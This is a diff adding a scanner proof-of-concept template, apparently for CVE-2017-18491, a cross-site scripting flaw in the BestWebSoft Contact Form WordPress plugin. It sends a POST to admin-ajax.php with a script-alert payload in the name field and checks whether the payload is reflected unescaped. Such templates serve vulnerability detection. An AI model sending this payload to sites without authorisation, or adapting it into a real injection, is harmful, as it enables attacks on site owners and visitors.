@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "通过向WordPress Contact Form by BestWebSoft插件的表单提交接口发送包含XSS载荷的POST请求，验证插件在输出用户可控数据时是否未进行HTML转义。若响应中包含未编码的恶意脚本，则确认存在跨站脚本漏洞。"
+id = "POC-AVE-2017-0069"
+name = "BestWebSoft Contact Form WordPress插件跨站脚本漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2017-18491",
+    "wordpress",
+    "xss",
+    "contact-form",
+]
+vuln_id = [
+    "CVE-2017-18491",
+    "AVE-2017-0069",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=contact_form_plugin&cntctfrm_contact_action=add&cntctfrm_contact_form=1&cntctfrm_field_name=<script>alert(document.domain)</script>&cntctfrm_field_email=test@test.com&cntctfrm_field_message=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(document.domain)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
